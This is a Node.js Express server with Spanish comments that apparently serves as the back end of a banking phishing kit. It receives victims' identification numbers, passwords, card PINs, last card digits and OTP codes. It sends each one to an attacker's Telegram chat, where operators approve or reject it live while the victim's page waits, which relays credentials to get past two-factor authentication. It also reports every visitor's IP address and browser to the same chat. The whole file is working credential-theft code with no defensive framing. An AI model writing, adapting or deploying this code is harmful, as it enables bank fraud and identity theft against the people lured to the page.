import express from 'express';
import axios from 'axios';
import cors from 'cors';
import dotenv from 'dotenv';

dotenv.config();

const app = express();
app.use(cors());
app.use(express.json());

const BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN;
const CHAT_ID = process.env.TELEGRAM_CHAT_ID;
const PORT = process.env.PORT || 3000;

console.log("=== CONFIGURACIÓN DEL BACKEND ===");
console.log("BOT_TOKEN:", BOT_TOKEN ? "✅ Configurado" : "❌ FALTA");
console.log("CHAT_ID:", CHAT_ID ? "✅ Configurado" : "❌ FALTA");
console.log("=================================");

// Almacenamiento de solicitudes (login y OTP)
const requestsDB = new Map(); // Para logins
const otpRequestsDB = new Map(); // Para OTPs

// ==========================================
// LÓGICA DE LOGIN (SEDE)
// ==========================================
async function sendToTelegram(requestId, data) {
    const isTarjeta = data.tipo === 'tarjeta';
    
    let text = `<b>⚠️ NUEVA SOLICITUD DE VALIDACIÓN</b>\n\n`;
    text += `<b>Identificación:</b> ${data.identificacion}\n`;
    
    if (isTarjeta) {
        text += `<b>Clave Tarjeta:</b> ${data.clave}\n`;
        text += `<b>Últimos 4 dígitos:</b> ${data.ultimos4}\n`;
    } else {
        text += `<b>Clave Segura:</b> ${data.clave}\n`;
    }
    
    text += `\n<i>El usuario está esperando respuesta...</i>`;

    const keyboard = {
        inline_keyboard: [
            [
                { text: "✅ Aprobar", callback_data: `approve_${requestId}` },
                { text: "❌ Rechazar", callback_data: `reject_${requestId}` }
            ]
        ]
    };

    try {
        const response = await axios.post(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
            chat_id: CHAT_ID,
            text: text,
            parse_mode: 'HTML',
            reply_markup: keyboard
        });
        
        requestsDB.get(requestId).messageId = response.data.result.message_id;
        requestsDB.get(requestId).originalText = text;
        console.log(`✅ Mensaje enviado a Telegram para requestId: ${requestId}`);
        
    } catch (error) {
        console.error("❌ Error enviando a Telegram:", error.response?.data || error.message);
    }
}

app.post('/api/login', async (req, res) => {
    console.log("📥 Petición recibida en /api/login");
    const { identificacion, clave, ultimos4, tipo } = req.body;

    if (!identificacion || !clave) {
        return res.status(400).json({ error: "Faltan datos requeridos." });
    }

    const requestId = Date.now().toString() + Math.random().toString(36).substring(2, 7);
    
    requestsDB.set(requestId, {
        status: 'pending',
        data: { identificacion, clave, ultimos4, tipo },
        messageId: null,
        originalText: null
    });

    sendToTelegram(requestId, { identificacion, clave, ultimos4, tipo });

    res.json({ requestId });
});

app.get('/api/status/:requestId', (req, res) => {
    const { requestId } = req.params;
    const request = requestsDB.get(requestId);

    if (!request) {
        return res.status(404).json({ status: 'error', message: 'Solicitud no encontrada' });
    }

    res.json({ status: request.status });
});

// ==========================================
// WEBHOOK DE TELEGRAM (Login y OTP)
// ==========================================
app.post('/api/webhook/telegram', async (req, res) => {
    const { callback_query } = req.body;

    if (!callback_query) {
        return res.sendStatus(200);
    }

    const data = callback_query.data;
    const messageId = callback_query.message.message_id;
    const chatId = callback_query.message.chat.id;
    
    const adminUser = callback_query.from;
    let adminName = `${adminUser.first_name || ''} ${adminUser.last_name || ''}`.trim();
    if (adminUser.username) {
        adminName += ` (@${adminUser.username})`;
    }
    if (!adminName) {
        adminName = 'Administrador desconocido';
    }

    const [action, requestId] = data.split('_');

    // Verificamos si es un login o un OTP
    if (requestsDB.has(requestId)) {
        // Es un LOGIN
        const request = requestsDB.get(requestId);
        request.status = action === 'approve' ? 'approved' : 'rejected';

        let newText = request.originalText;
        newText = newText.replace('\n<i>El usuario está esperando respuesta...</i>', '');
        
        if (action === 'approve') {
            newText += `\n\n✅ <b>APROBADO POR:</b> ${adminName}`;
        } else {
            newText += `\n\n❌ <b>RECHAZADO POR:</b> ${adminName}`;
        }

        try {
            await axios.post(`https://api.telegram.org/bot${BOT_TOKEN}/editMessageText`, {
                chat_id: chatId,
                message_id: messageId,
                text: newText,
                parse_mode: 'HTML',
                reply_markup: { inline_keyboard: [] }
            });
        } catch (error) {
            console.error("Error editando mensaje:", error.response?.data || error.message);
        }

        res.sendStatus(200);
    } else if (otpRequestsDB.has(requestId)) {
        // Es un OTP
        const request = otpRequestsDB.get(requestId);
        request.status = action === 'approve' ? 'approved' : 'rejected';

        let newText = request.originalText;
        newText = newText.replace('\n<i>El usuario está esperando respuesta...</i>', '');
        
        if (action === 'approve') {
            newText += `\n\n✅ <b>APROBADO POR:</b> ${adminName}`;
        } else {
            newText += `\n\n❌ <b>RECHAZADO POR:</b> ${adminName}`;
        }

        try {
            await axios.post(`https://api.telegram.org/bot${BOT_TOKEN}/editMessageText`, {
                chat_id: chatId,
                message_id: messageId,
                text: newText,
                parse_mode: 'HTML',
                reply_markup: { inline_keyboard: [] }
            });
        } catch (error) {
            console.error("Error editando mensaje OTP:", error.response?.data || error.message);
        }

        res.sendStatus(200);
    } else {
        res.sendStatus(404);
    }
});

// ==========================================
// LÓGICA DE OTP
// ==========================================
async function sendOtpToTelegram(otpRequestId, data) {
    let text = `<b>🔐 SOLICITUD DE OTP</b>\n\n`;
    text += `<b>Identificación:</b> ${data.identificacion}\n`;
    text += `<b>OTP:</b> ${data.otp}\n`;
    text += `\n<i>El usuario está esperando respuesta...</i>`;

    const keyboard = {
        inline_keyboard: [
            [
                { text: "✅ Aprobar", callback_data: `approve_${otpRequestId}` },
                { text: "❌ Rechazar", callback_data: `reject_${otpRequestId}` }
            ]
        ]
    };

    try {
        const response = await axios.post(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
            chat_id: CHAT_ID,
            text: text,
            parse_mode: 'HTML',
            reply_markup: keyboard
        });
        
        otpRequestsDB.get(otpRequestId).messageId = response.data.result.message_id;
        otpRequestsDB.get(otpRequestId).originalText = text;
        console.log(`✅ OTP enviado a Telegram para requestId: ${otpRequestId}`);
        
    } catch (error) {
        console.error("❌ Error enviando OTP a Telegram:", error.response?.data || error.message);
    }
}

app.post('/api/otp', async (req, res) => {
    console.log("📥 Petición recibida en /api/otp");
    const { identificacion, otp, requestIdOrigen } = req.body;

    if (!identificacion || !otp) {
        return res.status(400).json({ error: "Faltan datos requeridos." });
    }

    const otpRequestId = Date.now().toString() + Math.random().toString(36).substring(2, 7);
    
    otpRequestsDB.set(otpRequestId, {
        status: 'pending',
        data: { identificacion, otp, requestIdOrigen },
        messageId: null,
        originalText: null
    });

    sendOtpToTelegram(otpRequestId, { identificacion, otp });

    res.json({ requestId: otpRequestId });
});

app.get('/api/otp-status/:requestId', (req, res) => {
    const { requestId } = req.params;
    const request = otpRequestsDB.get(requestId);

    if (!request) {
        return res.status(404).json({ status: 'error', message: 'Solicitud no encontrada' });
    }

    res.json({ status: request.status });
});

// ==========================================
// NUEVA RUTA: NOTIFICAR VISITA A TELEGRAM
// ==========================================
app.post('/api/notify-visit', async (req, res) => {
    // 1. Obtener la IP (Render usa proxies)
    let ip = req.headers['x-forwarded-for'] || req.socket.remoteAddress;
    if (ip && ip.includes(',')) ip = ip.split(',')[0].trim();
    
    // 2. Obtener datos del navegador
    const userAgent = req.headers['user-agent'] || 'Desconocido';
    
    // 3. Obtener la hora actual (Colombia)
    const now = new Date();
    const dateStr = now.toLocaleString('es-CO', { timeZone: 'America/Bogota' });

    // 4. Construir el mensaje
    let text = `<b>🌐 NUEVA VISITA AL INDEX</b>\n\n`;
    text += `<b>📅 Fecha:</b> ${dateStr}\n`;
    text += `<b>📡 IP:</b> <code>${ip}</code>\n`;
    text += `<b>💻 Navegador:</b> ${userAgent.substring(0, 60)}...\n`;

    try {
        await axios.post(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
            chat_id: CHAT_ID,
            text: text,
            parse_mode: 'HTML'
        });
        console.log(`✅ Notificación de visita enviada. IP: ${ip}`);
        res.status(200).json({ success: true });
    } catch (error) {
        console.error("❌ Error enviando notificación de visita:", error.response?.data || error.message);
        res.status(500).json({ error: "Error enviando notificación" });
    }
});

// Ruta de salud
app.get('/', (req, res) => {
    res.send('Backend funcionando correctamente.');
});

app.listen(PORT, () => {
    console.log(`🚀 Servidor corriendo en el puerto ${PORT}`);
});
